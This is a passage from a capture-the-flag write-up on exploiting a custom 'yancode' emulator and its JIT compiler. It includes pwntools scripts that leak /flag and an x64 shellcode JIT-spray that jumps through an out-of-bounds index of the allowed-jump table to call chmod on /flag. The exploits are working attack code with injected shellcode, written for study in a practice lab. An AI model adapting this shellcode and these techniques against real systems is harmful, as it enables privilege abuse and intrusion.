    # p = gdb.debug(BINARY, close_fds=False, gdbscript=GDB_SCRIPT)

    # yan_shellcode_length = 0xff
    # TODO: change this back to "/flag"!!
    FLAG_PATH = b'/flag'
    OUT_PATH = b'MY_FLAG_OUT'
    flag_addr = 0
    out_addr = 0x40

    yan_buf = b''
    yan_buf += jump(addr=5, flags=Flags.UNCONDITIONAL)  # Skip the giga syscall
    yan_buf += inc_reg(Regs.d)  # d serves as the accumulator register. 
    yan_buf += giga_syscall()
    yan_buf += read_to_memory_gigasyscall(fd=0, offset=flag_addr, count=len(FLAG_PATH), expected_d=0)  # Write "/flag" into address 0
    yan_buf += open_gigasyscall(file_addr=flag_addr, expected_d=1)  # Open it
    yan_buf += read_to_memory_gigasyscall(fd=3, offset=0, count=0xff, expected_d=2)  # Read the flag content into address 0, instead of the string
    yan_buf += read_to_memory_gigasyscall(fd=0, offset=out_addr, count=len(OUT_PATH), expected_d=3)
    yan_buf += open_gigasyscall(file_addr=out_addr, expected_d=4)
    yan_buf += write_from_memory_gigasyscall(fd=4, offset=flag_addr, count=0xff, expected_d=5)  # Not sure if its needed

    with open(DEBUG_FILE_PATH, 'wb') as f:
        f.write(yan_buf)
    yan_buf_length = len(yan_buf)
    yan_buf += b'\x00' * (0x300 - len(yan_buf))  # Fill max possible yancode
    p.send(yan_buf)
    p.send(FLAG_PATH)
    p.send(OUT_PATH)

    p.interactive()

exploit()
```

Funnily, this program leaks the flag content by writing a file with the flag as its name on the file system, as it uses `open` to leak the flag :) \
This means we don't even need to use the `write` syscall. 

## Challenge 11

Now our emulator actually JITs yancode into x64 code on the fly! \
Maps a page as RWX, reads our content, compiles it to x64, and remaps it to RX only. Finally, executes the given memory. 

The goal is to call `chmod("/flag", 777)`, a single syscall that would get the job done. 

My idea is simple - forge every x64 instruction by using the `movabs` x64 instruction. This would allow us to write 8 bytes of our wish (the immediate part of the instruction). We would end every `movabs` instruction with a short jmp opcode, hence this method would support unlimited amount of 6 bytes (`8 - (sizeof(jmp)==2)`) instructions. 

Of course, the very first instruction should be a jump that would skip the 2 first bytes of the movabs instruction. 

A major mitigation this challenge has, is that it keeps track of the interpreted instructions addresses. \
Upon calling the `JMP` opcode, it accesses a recorded legitimate instructions addresses array, and only retireves legit addresses from there. \
Hence, we cannot simply jump to any address we wish on the native `x64` code.

Apperently there's a vuln (not sure if this was intended) where we can supply a malicious index to this "legitimate jump addresses" array, up to 64-bit. \
My first idea was to wrap around the VA space, hence accessing bytes prior to the leigitmate addresses array. 

For example, the legit addresses array starts at 0x7ffc0207d038:

```bash
0x7ffc0207d028: 0x0000000000000000      0x0000000001337000
0x7ffc0207d038: 0x0000000000000046      0x0000000000000057
0x7ffc0207d048: 0x0000000000000088      0x0000000000000099
0x7ffc0207d058: 0x00000000000000aa      0x00000000000000bb
0x7ffc0207d068: 0x00000000000000cc      0x00000000000000dd
```

If I’d supply index of `0xffffffffffffffff`, the program would access `0x0000000001337000`. \
However, this number is too large, and our `x64` address is only mapped to a single page. 

Apperently there's a better candidate at `0x7ffc0207da60`:

```bash
0x7ffc0207da48: 0x0000000000000006      0x0000000000001000
0x7ffc0207da58: 0x0000000000000011      0x0000000000000064
```

Which means we would be able to jump to address `0x64`, by setting the index to `325`.

```python
from dataclasses import dataclass
from pwn import *
import os, sys
import struct


BINARY = '/challenge/toddlerone_level11.0'
GDB_SCRIPT= '''
b *main+0x274
commands
b *0x1337064
end

c


'''
DEBUG_FILE_PATH = 'my_payload.txt'

@dataclass
class Regs:
    a = b''
    b = b''
    c = b''
    d = b''
    s = 0x04
    i = b''
    f = b''


@dataclass
class Opcodes:
    STM = b''
    IMM = 0x08
    ADD = b''
    CMP = b''
    JMP = 0x40
    LDM = b''
    STK = b''
    SYSCALL = b''


@dataclass
class Syscalls:
    OPEN = b''
    READ_CODE = b''
    READ_MEM = b''
    WRITE_MEM = b''
    SLEEP = b''
    EXIT = b''


@dataclass
class Flags:
    UNCONDITIONAL = 0
    EQUAL = b''


def instruction(opcode, reg1, reg2):
    buf = b''
    buf += struct.pack('<Q', reg2)
    buf += struct.pack('<Q', opcode)
    buf += struct.pack('<Q', reg1)
    
    return buf


def compare(reg1, reg2):
    buffer = b''
    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer


def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)


def write_register(register, value):
    return instruction(Opcodes.IMM, register, value)


def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer


def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer


def open_file(file_addr):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=2)  # O_RDWR
    buffer += write_register(register=Regs.c, value=0)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer


def read_stdin_to_memory(offset, count):
    return read_to_memory(0, offset, count)


def read_to_memory(fd, offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer


def write_stdout_from_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=1)  # stdout
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer


def inc_reg(reg):
    # Note - initially sets Regs.s to 1!
    buffer = b''
    buffer += write_register(Regs.s, 1)
    buffer += instruction(Opcodes.ADD, reg, Regs.s)
    return buffer


def gen_trampoline(addr):
    buffer = jump(addr, Flags.UNCONDITIONAL)
    return buffer


def gen_instruction(instr):
    assert(len(instr) <= 6)
    inst_value = b''
    inst_value += instr + (6 - len(instr)) * b'\x90'
    inst_value += b'\xeb\x09'  # jmp to next instruction (recall mov inst is being injected)

    buffer = write_register(Regs.s, value=struct.unpack('<Q', inst_value)[0])
    return buffer


def exploit():
    p = process(BINARY, close_fds=False)
    # p = gdb.debug(BINARY, close_fds=False, gdbscript=GDB_SCRIPT)

    FLAG_PATH = b'/flag'

    yan_buf = b''
    yan_buf += gen_instruction(b'\x90'*6)  # nop sled
    yan_buf += gen_instruction(b'\x90'*6)
    yan_buf += gen_instruction(b'\xeb\x51')  # jmp over the trampoline
    yan_buf += gen_trampoline(addr=325)  # OOB access of the legit addrs array. This const points to 0x64!
    
    yan_buf += gen_instruction(b'\x68\x2f\x66\x6c\x61\x5b')  # push 0x616c662f; pop rbx
    yan_buf += gen_instruction(b'\x6a\x67\x59')  # push 0x67; pop rcx
    yan_buf += gen_instruction(b'\x48\xC1\xe1\x20')  # shl rcx, 0x20
    yan_buf += gen_instruction(b'\x48\x01\xcb\x53')  # add rbx, rcx; push rbx
    yan_buf += gen_instruction(b'\x6a\x5a\x58')  # push 0x5a; pop rax
    yan_buf += gen_instruction(b'\x48\x89\xe7') # mov rdi, rsp
    yan_buf += gen_instruction(b'\x68\x77\x07\x00\x00\x5e')  # push 0x777; pop rsi
    yan_buf += gen_instruction(b'\x0f\x05')  # syscall
    # yan_buf_length = len(yan_buf)
    # yan_buf += b'\x42' * (0x1800 - len(yan_buf))  # Fill max possible yancode
    p.send(yan_buf)

    p.interactive()

exploit()
```
